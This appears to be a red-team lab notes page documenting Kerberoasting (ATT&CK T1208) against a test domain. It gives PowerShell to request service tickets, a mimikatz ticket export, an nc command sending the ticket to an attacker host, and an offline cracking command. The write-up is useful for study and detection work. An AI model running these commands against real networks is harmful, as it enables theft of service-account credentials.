---
description: Credential Access
---

# T1208: Kerberoasting

## Execution

Note the vulnerable domain member - a user account with `servicePrincipalName` attribute set:

![](../.gitbook/assets/kerberoast-principalname.png)

Attacker setting up an nc listener to receive a hash for cracking:

{% code-tabs %}
{% code-tabs-item title="attacker@local" %}
```csharp
nc -lvp 443 > kerberoast.bin
```
{% endcode-tabs-item %}
{% endcode-tabs %}

Attacker retrieving a kerberos ticker for a user account with `servicePrincipalName` set to `HTTP/dc-mantvydas.offense.local`:

{% code-tabs %}
{% code-tabs-item title="attacker@victim" %}
```csharp
Add-Type -AssemblyName System.IdentityModel  
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "HTTP/dc-mantvydas.offense.local"
```
{% endcode-tabs-item %}
{% endcode-tabs %}

![](../.gitbook/assets/kerberoast-kerberos-token.png)

Using kerberos to export the kerberos ticket for cracking:

{% code-tabs %}
{% code-tabs-item title="attacker@victim" %}
```csharp
mimikatz # kerberos::list /export
```
{% endcode-tabs-item %}
{% endcode-tabs %}

![](../.gitbook/assets/kerberoast-exported-kerberos-tickets.png)

Sending the exported ticket to attacking machine for offline cracking:

{% code-tabs %}
{% code-tabs-item title="attacker@victim" %}
```csharp
nc 10.0.0.5 443 < C:\tools\mimikatz\x64\2-40a10000-spotless@HTTP~dc-mantvydas.offense.local-OFFENSE.LOCAL.kirbi
```
{% endcode-tabs-item %}
{% endcode-tabs %}

Attacker can now try cracking the password for the the ticket

{% code-tabs %}
{% code-tabs-item title="attacker@local" %}
```csharp
python2 tgsrepcrack.py pwd kerberoast.bin
```
{% endcode-tabs-item %}
{% endcode-tabs %}

![](../.gitbook/assets/kerberoast-cracked.png)

## Observations

{% embed data="{\"url\":\"https://attack.mitre.org/wiki/Technique/T1208\",\"type\":\"link\",\"title\":\"Kerberoasting - ATT&CK for Enterprise\"}" %}

{% embed data="{\"url\":\"https://github.com/nidem/kerberoast\",\"type\":\"link\",\"title\":\"nidem/kerberoast\",\"description\":\"Contribute to kerberoast development by creating an account on Github.\",\"icon\":{\"type\":\"icon\",\"url\":\"https://github.com/fluidicon.png\",\"aspectRatio\":0},\"thumbnail\":{\"type\":\"thumbnail\",\"url\":\"https://avatars3.githubusercontent.com/u/4877511?s=400&v=4\",\"width\":365,\"height\":365,\"aspectRatio\":1}}" %}

{% embed data="{\"url\":\"https://blog.stealthbits.com/extracting-service-account-passwords-with-kerberoasting/\",\"type\":\"link\",\"title\":\"Extracting Service Account Passwords with Kerberoasting \| Insider Threat\",\"description\":\"Kerberoasting is effective for extracting service account credentials from Active Directory without needing elevated rights or causing domain traffic.\",\"icon\":{\"type\":\"icon\",\"url\":\"https://blog.stealthbits.com/wp-content/uploads/2016/06/cropped-Logo\_STEALTHbits\_Orb\_Blue\_250x250-192x192.png\",\"width\":192,\"height\":192,\"aspectRatio\":1},\"thumbnail\":{\"type\":\"thumbnail\",\"url\":\"https://blog.stealthbits.com/wp-content/uploads/2017/05/Blog2-banner-Extract-Service-Account-Passwords-Kerberoasting1024x326.jpg\",\"width\":1024,\"height\":326,\"aspectRatio\":0.318359375}}" %}

{% embed data="{\"url\":\"https://blog.xpnsec.com/kerberos-attacks-part-1/\",\"type\":\"link\",\"title\":\"Kerberos AD Attacks - Kerberoasting\",\"description\":\"Recently I\'ve been trying to make sure that my redteam knowledge is up to date, exploring many of the advancements in Active Directory Kerberos attacks... and there have been quite a few! I finally found some free time this week to roll up my sleeves and dig into the internals\",\"icon\":{\"type\":\"icon\",\"url\":\"https://blog.xpnsec.com/assets/favicon/android-icon-192x192.png?v=94d6be4395\",\"width\":192,\"height\":192,\"aspectRatio\":1},\"thumbnail\":{\"type\":\"thumbnail\",\"url\":\"https://blog.xpnsec.com/content/images/2017/09/cerberos-1.jpg\",\"width\":615,\"height\":539,\"aspectRatio\":0.8764227642276423}}" %}

